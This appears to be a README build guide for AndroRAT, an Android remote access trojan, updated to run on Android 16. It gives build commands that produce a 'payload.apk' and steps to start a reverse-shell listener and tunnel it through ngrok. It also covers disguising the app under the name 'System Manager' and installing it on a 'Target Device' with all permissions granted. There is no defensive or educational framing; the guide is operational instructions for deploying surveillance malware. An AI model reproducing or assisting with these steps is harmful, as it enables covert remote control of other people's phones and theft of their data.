# AndroRAT v2.2 - Android 16 Compatible Build Guide

## 🎯 Overview

This version of AndroRAT is fully compatible with:
- **Android 16 (API 36)** - Latest version
- **Android 5.0 to 15** - All previous versions
- **All device architectures** - ARM, ARM64, x86, x86_64

## 🔧 Build Configuration

### Android SDK Settings

```gradle
compileSdkVersion 36        // Compile against Android 16
targetSdkVersion 36         // Target Android 16
minSdkVersion 21            // Support Android 5.0+
buildToolsVersion 34.0.0    // Stable build tools
```

### Java Requirements

- **Java 17** or higher required
- Gradle 8.1.1+
- Android Gradle Plugin 8.1.4+

## 📦 Automated Build (GitHub Actions)

The repository now includes an automated GitHub Actions workflow that:

1. ✅ Builds the APK automatically on each push to `main` branch
2. ✅ Uses Java 17 for latest Android compilation support
3. ✅ Generates release APK compatible with Android 16
4. ✅ Uploads APK as a build artifact
5. ✅ Creates GitHub releases for tagged commits

### To Build via GitHub Actions:

1. **Make changes to the code**
2. **Push to main branch:**
   ```bash
   git add .
   git commit -m "Update: Android 16 compatible changes"
   git push origin main
   ```
3. **GitHub Actions automatically builds the APK**
4. **Download from: Actions → Latest workflow run → Artifacts**

Or create a release:
```bash
git tag v2.2-Android16
git push origin v2.2-Android16
```
APK will be attached to the GitHub Release.

## 🏗️ Manual Build (Local)

### Prerequisites

```bash
# Install Java 17
sudo apt install openjdk-17-jdk

# Set JAVA_HOME
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
```

### Build Steps

```bash
cd Android_Code
./gradlew clean assembleRelease

# APK location:
# app/build/outputs/apk/release/app-release.apk
```

## 🌐 Ngrok Configuration

To use with ngrok for internet connectivity:

1. **Get Ngrok Token:**
   - Sign up at [ngrok.com](https://ngrok.com)
   - Copy your auth token

2. **Using androRAT.py:**
   ```bash
   # Edit androRAT.py and add your token:
   conf.get_default().auth_token = "YOUR_NGROK_TOKEN"
   
   # Build with ngrok
   python3 androRAT.py --build --ngrok -p 8000 -o payload.apk -icon
   ```

3. **GitHub Actions Ngrok (Optional):**
   ```bash
   # Add secret in GitHub repo:
   Settings → Secrets → New repository secret
   Name: NGROK_AUTHTOKEN
   Value: your_token_here
   ```

## 📋 Key Files Modified for Android 16

### 1. `Android_Code/build.gradle`
- Updated plugin repositories (removed deprecated jcenter)
- Updated Gradle plugin to 8.1.4

### 2. `Android_Code/app/build.gradle`
- `compileSdkVersion 36` - Android 16 SDK
- `targetSdkVersion 36` - Target Android 16
- `minSdkVersion 21` - Android 5.0 support
- Java 8 compatibility (source + target)

### 3. `Android_Code/app/src/main/AndroidManifest.xml`
- App name: "System Manager" (not "Google Service Framework")
- Optional camera features (not required)
- All required permissions configured

### 4. `Android_Code/app/src/main/res/values/strings.xml`
- App name changed to avoid system service conflicts

### 5. `.github/workflows/gradle.yml`
- Java 17 for build
- Gradle release build configuration
- APK artifact upload

## ✅ Compatibility Checklist

- [x] Android 16 (API 36) support
- [x] Android 5.0 to 15 support
- [x] All device architectures (ARM, ARM64, x86, x86_64)
- [x] Optional hardware features (camera, microphone)
- [x] Proper app naming (no system app conflicts)
- [x] Java 17 compilation
- [x] AndroidX libraries updated
- [x] Gradle 8.x compatible

## 🚀 Installation

### On Target Device:

1. Download `app-release.apk` from GitHub Actions artifacts
2. Enable "Install unknown apps" in device settings
3. Install the APK
4. Grant all requested permissions
5. Open app to connect to listener

### With Ngrok:

```bash
# Terminal 1: Start listener
python3 androRAT.py --shell -i 0.0.0.0 -p 8000

# Terminal 2: Build and auto-connect (if using ngrok)
python3 androRAT.py --build --ngrok -p 8000 -o final.apk -icon
```

## 📊 Verification

Check APK compatibility:

```bash
# Using aapt (if available)
aapt dump badging app-release.apk | grep -i "sdk\|target\|min"

# Using adb (on device)
adb shell dumpsys package com.example.reverseshell2 | grep targetSdk
```

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| "App not compatible" | Ensure minSdkVersion ≤ your device API level |
| Java version error | Use `java -version` and ensure Java 17+ |
| Build tools not found | Run `./gradlew` first to download dependencies |
| Gradle daemon issues | Run `./gradlew --stop` then rebuild |
| APK too large | Build with `minifyEnabled true` in release config |

## 📚 Resources

- [Android 16 Release Notes](https://developer.android.com/about/versions/16)
- [Android Gradle Plugin Guide](https://developer.android.com/build/releases)
- [Ngrok Documentation](https://ngrok.com/docs)
- [Official Gradle Documentation](https://docs.gradle.org)

---

**Version:** 2.2-Android16  
**Last Updated:** March 2026  
**Status:** Production Ready ✅
